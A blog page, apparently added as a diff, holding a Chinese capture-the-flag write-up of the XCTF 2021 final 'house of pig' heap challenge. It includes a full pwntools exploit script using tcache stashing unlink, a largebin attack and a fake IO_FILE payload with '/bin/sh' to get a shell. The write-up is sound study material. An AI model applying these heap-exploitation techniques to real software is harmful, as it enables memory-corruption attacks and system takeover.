@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+  <script>
+    (function () {
+      try {
+        var t = localStorage.getItem('theme');
+        if (t === 'light' || t === 'dark') {
+          document.documentElement.setAttribute('data-theme', t);
+        }
+      } catch (e) {}
+    })();
+  </script>
+  <title>
+    
+    house of pig xctf2021final复现 丨
+    
+
+    K&#39;s Map | DeePunk&#39;s Blog
+  </title>
+
+  
+  <link rel="shortcut icon" href="/icon.svg">
+  
+
+  <!-- 字体 -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Serif:ital,wght@0,400;0,600;0,700;1,400;1,600&family=Noto+Serif+SC:wght@400;600;700&display=swap" rel="stylesheet">
+
+  
+  <link rel="preconnect" href="https://cdnjs.cloudflare.com">
+  <link id="theme" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-light.css">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+  <script defer src="/js/highlight.min.js"></script>
+  <script defer src="/js/image-zoom.js"></script>
+  <script defer src="/js/toc.js"></script>
+  
+
+  
+<link rel="stylesheet" href="/css/root.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/post.css">
+
+<meta name="generator" content="Hexo 8.1.2"><link rel="alternate" href="/atom.xml" title="K's Map | DeePunk's Blog" type="application/atom+xml">
+</head>
+
+  <body>
+    <header class="header">
+  <section class="header-container">
+    <a class="logo" href="/">K&#39;s Map | DeePunk&#39;s Blog</a>
+    <ul class="nav">
+      
+      <li><a href="/about">about</a></li>
+      
+    </ul>
+  </section>
+</header>
+      
+            <main class="main">
+              <article class="post">
+  
+  <div class="post-title">house of pig xctf2021final复现</div>
+  <div class="post-meta">
+    <div class="date">2023 七月 27日</div>
+    <div class="tags">
+      
+      <a class="tag-item" href="/tags/pwn" style="color: #d1d5da;">pwn</a>
+      
+      <a class="tag-item" href="/tags/wp" style="color: #d1d5da;">wp</a>
+      
+      <a class="tag-item" href="/tags/iofile" style="color: #d1d5da;">iofile</a>
+      
+    </div>
+  </div>
+  
+
+  <main class="post-content"><blockquote>
+<p>阴间堆风水</p>
+</blockquote>
+<h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><h3 id="修复switch"><a href="#修复switch" class="headerlink" title="修复switch"></a>修复switch</h3><p>0: 0x3985 invalid</p>
+<p>1: 0x3797 add</p>
+<p>2: 0x37B3 show</p>
+<p>3: 0x37cf edit</p>
+<p>4: 0x37eb delet</p>
+<p>5: 0x3807 change role</p>
+<h3 id="struct"><a href="#struct" class="headerlink" title="struct"></a>struct</h3><p>通过add函数，猜测出heap_list，heap_size的作用，结合free、edit函数找到两个标志位</p>
+<p>结合每个的大小与偏移，推测出数组的数量</p>
+<pre><code class="highlight c"><span class="class"><span class="keyword">struct</span> <span class="title">house</span></span>
+<span class="class">&#123;</span>
+    <span class="type">char</span> *<span class="built_in">list</span>[<span class="number">0x18</span>];
+    <span class="type">int</span> size[<span class="number">0x18</span>];
+    <span class="type">char</span> flag1[<span class="number">0x18</span>];
+    <span class="type">char</span> flag2[<span class="number">0x18</span>];
+&#125;;</code></pre>
+
+<pre><code class="highlight c"><span class="class"><span class="keyword">struct</span> <span class="title">tmp_house</span></span>
+<span class="class">&#123;</span>
+  <span class="class"><span class="keyword">struct</span> <span class="title">house</span> <span class="title">peppa_house</span>;</span>
+  <span class="type">int</span> current_peppasize;
+  <span class="class"><span class="keyword">struct</span> <span class="title">house</span> <span class="title">mummy_house</span>;</span>
+  <span class="type">int</span> current_mummysize;
+  <span class="class"><span class="keyword">struct</span> <span class="title">house</span> <span class="title">daddy_house</span>;</span>
+  <span class="type">int</span> current_daddysize;
+  <span class="type">int</span> show_time;
+  <span class="type">int</span> edit_time;
+&#125;;</code></pre>
+
+<h3 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h3><ol>
+<li>填充1个1和n个0,使信息长度为N*512+448(bit)</li>
+<li>用64bit存储填充前信息长度，加在后面，长度变为(N+1)*512</li>
+<li>装入标准的幻数: A&#x3D;0x67452301, B&#x3D;0xefcdab89, C&#x3D;0x98badcfe, D&#x3D;0x10325476</li>
+<li>四轮循环运算，循环次数为分组个数(N+1)</li>
+</ol>
+<pre><code class="highlight python"><span class="keyword">import</span> hashlib
+ 
+<span class="keyword">def</span> <span class="title function_">main</span>():
+    start = <span class="string">&quot;3c4400&quot;</span>
+    <span class="keyword">while</span> <span class="literal">True</span>:
+        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000000</span>):
+            s=<span class="string">&#x27;A&#x27;</span>+<span class="built_in">str</span>(i)
+            <span class="comment">#s=&#x27;B&#x27;+str(i)</span>
+            <span class="comment">#s=&#x27;C&#x27;+str(i)</span>
+            <span class="built_in">print</span> <span class="string">&quot;Test %s &quot;</span> % s
+            <span class="keyword">if</span> hashlib.md5(s).hexdigest().startswith(start):
+                <span class="built_in">print</span>(s)
+                <span class="keyword">return</span>
+ 
+<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:
+    main()
+<span class="string">&#x27;&#x27;&#x27;</span>
+<span class="string">A39275120</span>
+<span class="string">B3332073</span>
+<span class="string">C75929410</span>
+<span class="string">&#x27;&#x27;&#x27;</span></code></pre>
+
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><ul>
+<li>add大小0x90~0x430，同一角色size只能增加</li>
+<li>peppa 20次，mummy 10次，daddy 5次</li>
+<li>peppa 0x30i, mummy 0x30i + 0x10, daddy 0x31i + 0x20</li>
+<li>view 2次，edit 8次</li>
+<li>delet后无法delet，切换角色可edit、view</li>
+<li>daddy的add不用一直增加！</li>
+<li>daddy add最后一次时会多calloc0xe8</li>
+</ul>
+<h2 id="堆风水"><a href="#堆风水" class="headerlink" title="堆风水"></a>堆风水</h2><h3 id="role的选择"><a href="#role的选择" class="headerlink" title="role的选择"></a>role的选择</h3><p>注意不同role的堆列表是独立的，同时不同role能修改的位置也不同</p>
+<p>peppa可以修改fd,bk</p>
+<p>mummy可以修改fd_nextsize,bk_nextsize</p>
+<p>因而最好peppa打tcache stashing unlink, mummy打largebin attack</p>
+<p>当然这不是绝对的，我们可以通过UAF达到对同一个堆块的混淆</p>
+<h3 id="tcache-stashing-unlink"><a href="#tcache-stashing-unlink" class="headerlink" title="tcache stashing unlink"></a>tcache stashing unlink</h3><p>1.<code>tcache</code>中放<code>5</code>个，<code>smallbin</code>中放两个</p>
+<p>2.将<strong>后进</strong><code>smallbin</code>的<code>chunk</code>的<code>bk</code>(不破坏<code>fd</code>指针的情况下)修改为<code>[target-0x10]</code>(即target为将要加入tchache的chunk的user pointer处），同时将目标地址<code>+0x08</code>处（即target-&gt;bk)的值设置为一个指向可写内存的指针。</p>
+<p> 3.从smallbin中取一个chunk，走完stash流程，目标地址就会被链入tcache中。</p>
+<h3 id="布局的问题"><a href="#布局的问题" class="headerlink" title="布局的问题"></a>布局的问题</h3><h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><blockquote>
+<p> 在tcache中放了5个的情况下，如何使两个chunk进入<strong>相同大小</strong>的smallbin？</p>
+</blockquote>
+<p>问题转化为：如何使两个chunk进入相同大小的unsortedbin，而不进入tcache</p>
+<p><img src="/../img/xctf2021finalhouseofpig%E5%A4%8D%E7%8E%B0.assets/image-20230723173130250.png" alt="image-20230723173130250"></p>
+<p>考虑当unsortedbin中只有一个chunk时，分配较小的chunk时会从其中切一块使用，另一块放入lastrmainder（同样是unsortedbin）</p>
+<p>所以我们先获取一个较大的unsortedbin，（这一步通过填满tcache获得），随后malloc一块较小的chunk,就可以获得目标大小的unsortedbin</p>
+<p>注意这里最后需要获得两块unsortedbin,注意避免在分配第二块时把第一块拿掉。我一开始分配的大小为0x150,刚好可以拿掉一个0xa0剩下一个0xa0,但是在分配第二快时就会出现问题</p>
+<p>我的解决方案是，切割0x160的块，从中取出0xb0，刚好剩下0xa0,同时第二次取0xb0时不会出现把获得的unsortedbin取走的情况</p>
+<p>网上的解决方案是：再填另一个tcache，两次用不同的unsortedbin切割，但是这种方法比较浪费次数</p>
+<p>同时，经过计算、微调，我这里切下来的smallbin的fd和bk刚好位于chunk1-&gt;7,1-&gt;8的可写区域</p>
+<h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><blockquote>
+<p>改到_IO_list_all的指针后，如何修改内容？</p>
+</blockquote>
+<p>本题比较阴间的地方是，不能完整地修改一个堆块</p>
+<p>好在出题人给add3加了一个gift,可以申请一个0xe8的完整可写的堆块</p>
+<p>所以最后可以把largebin attack指向的largebin留着，完成add3的最后一步，使得daddy从这个largechunk中切一块，从而直接获得完整的修改权限</p>
+<p>下策是修改large chunk的chain指针，使其指向可写堆块</p>
+<h3 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h3><pre><code class="highlight python"><span class="comment">#!/usr/bin/env python2</span>
+<span class="comment"># -*- coding: utf-8 -*-</span>
+<span class="keyword">from</span> pwn <span class="keyword">import</span>*
+
+context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>, terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>])
+<span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):
+	cmd += <span class="string">&quot;&quot;</span>
+	gdb.attach(p, cmd)
+	pause()
+
+host = <span class="string">&quot;&quot;</span>
+port = <span class="number">0</span>
+p = process(<span class="string">&quot;./pig&quot;</span>)
+<span class="comment"># libc=ELF(&quot;./libc.so.6&quot;)</span>
+<span class="comment">#p = remote(host, port)</span>
+
+<span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>): <span class="comment">#0xa0-0x430</span>
+	p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;1&quot;</span>)
+	p.sendlineafter(<span class="string">&quot;size: &quot;</span>, <span class="built_in">str</span>(size).encode())
+	p.sendafter(<span class="string">&quot;message: &quot;</span>, content)
+<span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">index</span>):
+	p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;2&quot;</span>)
+	p.sendlineafter(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(index).encode())
+<span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):
+	p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;3&quot;</span>)
+	p.sendlineafter(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(index).encode())
+	p.sendafter(<span class="string">&quot;message: &quot;</span>, content)
+<span class="keyword">def</span> <span class="title function_">delet</span>(<span class="params">index</span>):
+	p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;4&quot;</span>)
+	p.sendlineafter(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(index).encode())
+<span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">role</span>):
+	p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;5&quot;</span>)
+	<span class="keyword">if</span> role == <span class="number">1</span>:
+		p.sendlineafter(<span class="string">&quot;user:\n&quot;</span>, <span class="string">&quot;A39275120&quot;</span>)
+	<span class="keyword">elif</span> role == <span class="number">2</span>:
+		p.sendlineafter(<span class="string">&quot;user:\n&quot;</span>, <span class="string">&quot;B3332073&quot;</span>)
+	<span class="keyword">elif</span> role == <span class="number">3</span>:
+		p.sendlineafter(<span class="string">&quot;user:\n&quot;</span>, <span class="string">&quot;C75929410&quot;</span>)
+
+<span class="comment">#tcache 0xa0</span>
+change(<span class="number">2</span>)
+add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))
+add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))
+add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))
+add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))
+add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))<span class="comment">#2-&gt;4</span>
+
+<span class="comment">#unsortedbin-&gt;smallbin</span>
+
+<span class="comment">#tcache 0x160</span>
+change(<span class="number">1</span>)
+add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))
+add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))
+add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))
+add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))
+add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))
+add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))
+add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))<span class="comment">#1-&gt;6</span>
+
+add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))<span class="comment">#1-&gt;7</span>
+change(<span class="number">2</span>)
+add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))<span class="comment">#protect 2-&gt;5</span>
+change(<span class="number">1</span>)
+add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))<span class="comment">#1-&gt;8</span>
+
+<span class="comment">#fill tcache 0x160</span>
+delet(<span class="number">0</span>)
+delet(<span class="number">1</span>)
+delet(<span class="number">2</span>)
+delet(<span class="number">3</span>)
+delet(<span class="number">4</span>)
+delet(<span class="number">5</span>)
+delet(<span class="number">6</span>)
+
+<span class="comment">#fill tcache 0xa0 to 5</span>
+change(<span class="number">2</span>)
+delet(<span class="number">0</span>)
+delet(<span class="number">1</span>)
+delet(<span class="number">2</span>)
+delet(<span class="number">3</span>)
+delet(<span class="number">4</span>)
+
+<span class="comment">#split into unsorted bin</span>
+change(<span class="number">1</span>)
+delet(<span class="number">7</span>)
+
+change(<span class="number">3</span>)
+change(<span class="number">1</span>)<span class="comment">#to clear flag0</span>
+view(<span class="number">7</span>)<span class="comment">#leak libc</span>
+libc_base = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))-<span class="number">0x219ce0</span>
+free_hook = libc_base + <span class="number">0x2204a8</span>
+iolistall = libc_base + <span class="number">0x21a680</span>
+memset_got = libc_base + <span class="number">0x219188</span>
+log.success(<span class="string">&quot;libc_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))
+log.success(<span class="string">&quot;free_hook = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(free_hook)))
+log.success(<span class="string">&quot;iolistall = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(iolistall)))
+log.success(<span class="string">&quot;memset_got = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(memset_got)))
+
+change(<span class="number">3</span>)
+add(<span class="number">0xb0</span>, cyclic(<span class="number">0x30</span>))<span class="comment">#smallbin 0 = 1-&gt;7	</span>
+change(<span class="number">1</span>)
+add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))<span class="comment">#into smallbin 1-&gt;9</span>
+delet(<span class="number">8</span>)
+change(<span class="number">3</span>)
+add(<span class="number">0xb0</span>, cyclic(<span class="number">0x30</span>))<span class="comment">#smallbin 1 = 1-&gt;8</span>
+<span class="comment">#unsortedbin finished, 1-&gt;9(0x160);2-&gt;5(0xa0);3-&gt;1</span>
+
+<span class="comment">#leak heap_base</span>
+change(<span class="number">1</span>)
+add(<span class="number">0x410</span>, cyclic(<span class="number">0x160</span>))<span class="comment">#1-&gt;10</span>
+add(<span class="number">0x410</span>, cyclic(<span class="number">0x160</span>))<span class="comment">#1-&gt;11</span>
+delet(<span class="number">10</span>)
+add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment">#1-&gt;12</span>
+fixed_largebin_fd = libc_base + <span class="number">0x21a0d0</span>
+change(<span class="number">2</span>)
+change(<span class="number">1</span>)
+payload = cyclic(<span class="number">0x160</span>)
+edit(<span class="number">10</span>, payload)
+view(<span class="number">10</span>)
+p.recvuntil(<span class="string">&quot;daaa&quot;</span>)
+heap_base = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x13120</span>
+log.success(<span class="string">&quot;heap0_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))
+<span class="comment">#fix it</span>
+payload = p64(fixed_largebin_fd)*<span class="number">2</span> + cyclic(<span class="number">0x150</span>)
+edit(<span class="number">10</span>, payload)
+change(<span class="number">2</span>)
+add(<span class="number">0x410</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 2-&gt;6 largebin1</span>
+
+<span class="comment">#largebin attack</span>
+change(<span class="number">2</span>)
+add(<span class="number">0x410</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 2-&gt;7 largebin2</span>
+change(<span class="number">1</span>)
+add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 1-&gt;13 protect</span>
+change(<span class="number">2</span>)
+add(<span class="number">0x410</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 2-&gt;8 </span>
+change(<span class="number">1</span>)
+add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 1-&gt;14 protect</span>
+change(<span class="number">2</span>)
+add(<span class="number">0x420</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 2-&gt;9 largebin3</span>
+change(<span class="number">1</span>)
+add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 1-&gt;15 protect</span>
+
+change(<span class="number">2</span>)
+delet(<span class="number">9</span>)
+change(<span class="number">1</span>)
+add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># trigger largebin3 1-&gt;16</span>
+
+<span class="comment">#largebin attack1</span>
+change(<span class="number">2</span>)
+delet(<span class="number">6</span>)
+payload = p64(heap_base+<span class="number">0x14e60</span>) + p64(free_hook + <span class="number">0x8</span>-<span class="number">0x20</span>)+cyclic(<span class="number">0x150</span>)
+edit(<span class="number">9</span>, payload)
+
+change(<span class="number">1</span>)
+add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># trigger largebin1 1-&gt;17</span>
+
+change(<span class="number">3</span>)
+add(<span class="number">0x410</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># memsetgot-0x8 -&gt; 2-&gt;9   3-&gt;2</span>
+
+<span class="comment">#fix largebin&amp;attck2</span>
+change(<span class="number">2</span>)
+delet(<span class="number">7</span>)
+payload = p64(heap_base+<span class="number">0x14e60</span>) + p64(iolistall-<span class="number">0x20</span>)+cyclic(<span class="number">0x150</span>)
+edit(<span class="number">9</span>, payload)
+change(<span class="number">1</span>)
+add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># trigger largebin2 1-&gt;18 iolistall-&gt; 2-&gt;7</span>
+<span class="comment">#fix largebin</span>
+change(<span class="number">2</span>)
+payload = p64(heap_base+<span class="number">0x14e60</span>)*<span class="number">2</span>+cyclic(<span class="number">0x150</span>)
+edit(<span class="number">7</span>, payload)
+payload = p64(heap_base+<span class="number">0x13da0</span>)*<span class="number">2</span>+cyclic(<span class="number">0x150</span>)
+edit(<span class="number">9</span>, payload)
+
+<span class="comment">#tcache smashing unlink</span>
+change(<span class="number">3</span>)
+add(<span class="number">0x420</span>, cyclic(<span class="number">0x160</span>)) <span class="comment">#2-9 calloced</span>
+
+change(<span class="number">1</span>)
+payload = cyclic(<span class="number">0x40</span>) + p64(heap_base+<span class="number">0x12ce0</span>) + p64(free_hook-<span class="number">0x10</span>)+cyclic(<span class="number">0x110</span>)
+edit(<span class="number">8</span>, payload)
+change(<span class="number">3</span>)
+
+<span class="comment"># debug()</span>
+
+add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))   <span class="comment">#3-&gt;4</span>
+<span class="comment">#gift!</span>
+p.recvuntil(<span class="string">&quot;01dwang&#x27;s Gift:\n&quot;</span>)
+<span class="comment">#fake IOFILE</span>
+payload = <span class="string">&quot;&quot;</span>
+p.send(payload)
+
+debug()
+
+
+p.interactive()</code></pre>
+
+<h2 id="伪造IOFILE"><a href="#伪造IOFILE" class="headerlink" title="伪造IOFILE"></a>伪造IOFILE</h2><h3 id="改-free-hook做法"><a href="#改-free-hook做法" class="headerlink" title="改__free_hook做法"></a>改__free_hook做法</h3><pre><code class="highlight c"><span class="type">int</span> _IO_str_overflow (FILE *fp, <span class="type">int</span> c)
+&#123;
+  <span class="type">int</span> flush_only = c == EOF;
+  <span class="type">size_t</span> pos;
+  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)
+      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;
+  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))
+    &#123;
+      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;
+      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;
+      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;
+    &#125;
+  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;
+  <span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))
+    &#123;
+      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span>
+    <span class="keyword">return</span> EOF;
+      <span class="keyword">else</span>
+        &#123;
+          <span class="type">char</span> *new_buf;
+          <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;
+          <span class="type">size_t</span> old_blen = _IO_blen (fp);
+          <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;
+          <span class="keyword">if</span> (new_size &lt; old_blen)
+            <span class="keyword">return</span> EOF;
+          new_buf = <span class="built_in">malloc</span> (new_size); <span class="comment">// 1</span>
+          <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)
+            &#123;
+              <span class="comment">/*      __ferror(fp) = 1; */</span>
+              <span class="keyword">return</span> EOF;
+            &#125;
+          <span class="keyword">if</span> (old_buf)
+            &#123;
+              <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen); <span class="comment">// 2</span>
+              <span class="built_in">free</span> (old_buf); <span class="comment">// 3</span>
+              <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span>
+              fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;
+            &#125;
+          <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen); <span class="comment">// 4</span>
+ 
+          _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);
+          fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);
+          fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);
+          fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);
+          fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);
+ 
+          fp-&gt;_IO_write_base = new_buf;
+          fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;
+        &#125;
+    &#125;
+ 
+  <span class="keyword">if</span> (!flush_only)
+    *fp-&gt;_IO_write_ptr++ = (<span class="type">unsigned</span> <span class="type">char</span>) c;
+  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)
+    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;
+  <span class="keyword">return</span> c;
+&#125;
+libc_hidden_def (_IO_str_overflow)</code></pre>
+
+<pre><code class="highlight c">old_blen = _IO_blen (fp) = (fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base
+new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>
+new_buf = <span class="built_in">malloc</span> (new_size)
+
+old_buf = fp-&gt;_IO_buf_base
+<span class="built_in">memcpy</span> (new_buf, old_buf, old_blen)
+
+<span class="built_in">free</span> (old_buf);
+
+<span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen)</code></pre>
+
+<p>此时<code>_IO_list_all</code>指针已经指向了gift chunk,这个chunk的内容完全是可控的</p>
+<p><img src="/../img/xctf2021finalhouseofpig%E5%A4%8D%E7%8E%B0.assets/image-20230724133629983.png" alt="image-20230724133629983"></p>
+<p>注意前面tcache stashing unlink改的位置，可能需要在__free_hook的地址处加减0x8，因为tcache申请会检查十六字节对齐</p>
+<p>因为我没用原题的glibc,这里我对齐之后，0xe8大小的堆块不够写了，按照出题人的思路应该是刚好够写的</p>
+<pre><code class="highlight python">fake_IO_addr = heap_base+<span class="number">0x13da0</span>
+payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0xffffffffffffffff</span>) <span class="comment">#write_ptr</span>
+payload += p64(<span class="number">0</span>)<span class="comment">#write_end # fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base &gt;= _IO_buf_end - _IO_buf_base</span>
+payload += p64(fake_IO_addr+<span class="number">0xe0</span>)<span class="comment">#buf_base</span>
+payload += p64(fake_IO_addr+<span class="number">0xe0</span>+<span class="number">0x1e</span>) <span class="comment">#buf_end</span>
+payload = payload.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)
+payload += p64(libc_base+<span class="number">0x2166c0</span>)
+payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0</span>)+p64(libc_base+<span class="number">0x50d60</span>)</code></pre>
+
+<h3 id="改memset-got做法"><a href="#改memset-got做法" class="headerlink" title="改memset got做法"></a>改memset got做法</h3><p>由于libc是partial RELRO，got表可写</p>
+<p>因此可以把memset的got当作一个__free_hook</p>
+<p>注意这里做tcache stashing unlink时不能直接覆盖memset的got表，这是因为calloc中会调用memset,如果这时的got已经进入tcache,则会变成加密后的fd，rip运行到这里时会报错</p>
+<p>因而正确的做法应该是预留一定的空间，本题限制较大，故不做演示，仅提出思路</p>
+</main>
+
+  
+</article>
+            </main>
+            
+              <footer class="footer">
+  
+  <span>Copyright © 2021 DeePunk</span>
+  
+</footer>
+
+<button id="theme-toggle" type="button" aria-label="切换主题">☾</button>
+                
+<script src="/js/theme.js"></script>
+
+  </body>
+
+</html>
